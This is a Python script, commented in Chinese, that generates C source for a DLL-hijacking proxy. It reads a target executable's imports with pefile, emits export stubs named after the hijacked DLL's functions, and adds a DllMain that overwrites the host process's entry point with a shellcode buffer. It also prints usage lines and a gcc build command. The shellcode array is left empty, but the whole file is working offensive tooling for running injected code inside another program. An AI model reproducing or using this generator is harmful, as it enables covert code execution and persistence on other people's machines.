#include:utf-8
import os, string, shutil,re,sys
import pefile
def GenerateAvailableIATHijackTamplate(module_name,target_dll,output):
    tamplate = '''
#include <windows.h>
#include <Shlwapi.h>
#include<tlhelp32.h>
#include<tchar.h>
#pragma comment( lib, "Shlwapi.lib")
#include <Psapi.h>
#pragma comment(lib, "Psapi.lib")
'''
    tamplate_end = """
BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)
{
    if (dwReason == DLL_PROCESS_ATTACH)
    {
        MODULEINFO moduleInfoe;
        SIZE_T bytesWritten;
        GetModuleInformation(GetCurrentProcess(), GetModuleHandle(NULL), &moduleInfoe, sizeof(moduleInfoe));
        unsigned char shellcode[] = "";
        int shellcode_size = 800;
        HANDLE currentProcess = GetCurrentProcess();
        WriteProcessMemory(currentProcess, moduleInfoe.EntryPoint, (LPCVOID)&shellcode, shellcode_size, &bytesWritten);
    }
    else if (dwReason == DLL_PROCESS_DETACH){}
    return TRUE;
}
"""
    pe = pefile.PE(module_name)
    for importeddll in pe.DIRECTORY_ENTRY_IMPORT:
        DllName = str(importeddll.dll,encoding = "utf-8")
        if(DllName != target_dll):
            continue
        print("即将要劫持的目标为:%s，注意，请确保这个DLL不是系统DLL，如果这个DLL是系统DLL可能会无法劫持成功" % DllName)
        i = 1 
        for importedapi in importeddll.imports:
            print(importedapi.name)
            FunctionName = str(importedapi.name,encoding = "utf-8")
            print("导出函数名为:%s" % FunctionName)
            tamplate += """#pragma comment(linker, "/EXPORT:%s=%s,@%s")\n""" % (FunctionName,FunctionName,i)
            i+=1
            tamplate += """EXTERN_C __declspec(naked) void __cdecl %s(void){}\n""" % (FunctionName)
        
    tamplate += tamplate_end
    pe.close()
    print("正在生成代码....")
    print(tamplate)
    print("代码生成完成，正在保存..")
    f = open(output,"w")
    f.write(tamplate)
    f.close()
    print("代码报错完成，请确保编译后的DLL名为:%s" % DllName)
    print("或者使用GCC编译，编译命令如下\n\tgcc %s -lShlwapi -lPsapi -shared -o %s" % (output,target_dll) )
if len(sys.argv) <= 3:
    useage = """
    python iat_dll_hijack.py <你要劫持的目标exe> <报错的DLL> <代码模板保存的路径>
    模板可用vs或者gcc直接编译
    Example: python iat_dll_hijack.py uu.exe ui.dll code.c
    """
    print(useage)
    exit(0)
GenerateAvailableIATHijackTamplate(sys.argv[1],sys.argv[2],sys.argv[3])